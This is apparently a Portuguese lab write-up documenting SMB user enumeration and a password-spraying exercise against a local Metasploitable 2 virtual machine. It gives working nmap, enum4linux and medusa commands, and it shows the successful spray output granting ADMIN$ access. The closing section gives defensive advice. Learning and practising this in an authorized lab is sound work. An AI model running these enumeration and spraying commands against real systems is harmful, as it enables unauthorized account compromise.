# 04 — Password Spraying e enumeração em SMB

## Objetivo

Documentar a enumeração de usuários e a simulação controlada de Password Spraying no serviço SMB do ambiente local autorizado.

## Conceitos

- **Enumeração de usuários:** identificação de nomes de contas expostos pelo serviço ou ambiente.
- **Password Spraying:** testar uma mesma senha de laboratório contra um conjunto pequeno de contas, em vez de testar muitas senhas contra uma única conta.

## Escopo

- Alvo: Metasploitable 2, máquina virtual local.
- IP do alvo: `192.168.100.10`.
- Origem: Kali Linux (`192.168.100.20`).
- Serviço: SMB / Samba.
- Testes limitados ao ambiente virtual próprio.

## Reconhecimento do serviço

A partir do Kali Linux, foi executado:

```bash
sudo nmap -sV -p 139,445 192.168.100.10
```

**Resultado observado:**

| Campo | Resultado |
|---|---|
| Host | `192.168.100.10` |
| Estado do host | `up` |
| Porta 139/tcp | `open` |
| Porta 445/tcp | `open` |
| Serviço | `netbios-ssn` |
| Serviço identificado | Samba `smbd 3.X - 4.X` |
| Workgroup | `WORKGROUP` |

## Verificação do módulo SMB no Medusa

Foi executado:

```bash
medusa -d | grep -i smb
```

**Resultado observado:** `smbnt.mod`, versão `3.0`, com suporte indicado a SMBv1–v3 e autenticação LM/NTLM/LMv2/NTLMv2.

As opções do módulo foram consultadas com:

```bash
medusa -M smbnt -q
```

Opções relevantes para o exercício:

| Opção | Finalidade |
|---|---|
| `-U` | Arquivo com nomes de usuários |
| `-p` | Uma única senha |
| `GROUP:LOCAL` | Contexto de contas locais, conforme parâmetro do módulo |
| `-t 1` | Uma tarefa concorrente |

## Enumeração de usuários

Foi executado no Kali:

```bash
enum4linux -U 192.168.100.10
```

A saída exibiu contas locais do Metasploitable 2. No trecho visível da captura foram identificados, entre outros:

```text
games, nobody, bind, proxy, syslog, user, www-data, root,
news, postgres, bin, mail, distccd, proftpd, dhcp, daemon,
sshd, man, lp, mysql, gnats, libuuid, backup, msfadmin,
telnetd, sys, klog, postfix, service, list, irc, ftp,
tomcat55, sync
```

**Interpretação:** a enumeração SMB revelou nomes de contas locais. A presença de um nome na enumeração não prova, por si só, que a conta aceite autenticação SMB.

## Lista de usuários para o exercício

Foi criada a lista `users-smb.txt` com três nomes que apareceram na enumeração:

- `msfadmin`
- `user`
- `root`

A lista está publicada em [`wordlists/users-smb.txt`](../wordlists/users-smb.txt).

## Execução do Password Spraying

Foi executado no Kali:

```bash
medusa -h 192.168.100.10 -U users-smb.txt -p msfadmin -M smbnt -m GROUP:LOCAL -t 1 -v 4
```

O teste utilizou uma única senha (`msfadmin`) contra os três nomes da lista, com uma tarefa concorrente e restrito ao Metasploitable 2 local.

**Saída observada no terminal:**

```text
ACCOUNT FOUND: [smbnt] Host: 192.168.100.10 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

**Resultado:** o Medusa reportou uma correspondência para o usuário `msfadmin` e indicou acesso permitido ao compartilhamento administrativo `ADMIN$`. Na captura fornecida, não aparecem outras correspondências bem-sucedidas para `user` ou `root`; não se deve concluir apenas com essa saída que essas contas não existam ou que não aceitem qualquer outra credencial.

## Resultado observado

- Data: 24/11/2026.
- Origem: Kali Linux (`192.168.100.20`).
- Alvo: Metasploitable 2 (`192.168.100.10`).
- Portas SMB: `139/tcp` e `445/tcp`, ambas abertas.
- Serviço: Samba `smbd 3.X - 4.X`, workgroup `WORKGROUP`.
- Enumeração: identificou diversas contas locais.
- Lista de usuários: `users-smb.txt` (`msfadmin`, `user`, `root`).
- Senha única testada: `msfadmin`.
- Resultado reportado: conta `msfadmin` com `ADMIN$ - Access Allowed`.

## Análise

O exercício demonstrou como uma senha compartilhada ou previsível pode permitir acesso a uma conta SMB. A resposta `ADMIN$ - Access Allowed` indica que o módulo conseguiu acessar o compartilhamento administrativo com a conta encontrada. Em ambientes reais, devem ser usadas senhas únicas por conta, privilégio mínimo, restrição de SMB aos hosts necessários e monitoramento de tentativas repetidas com a mesma senha em várias contas.

## Evidências

Adicionar as capturas em `images/evidencias/`, ocultando informações sensíveis que não devam ser publicadas.
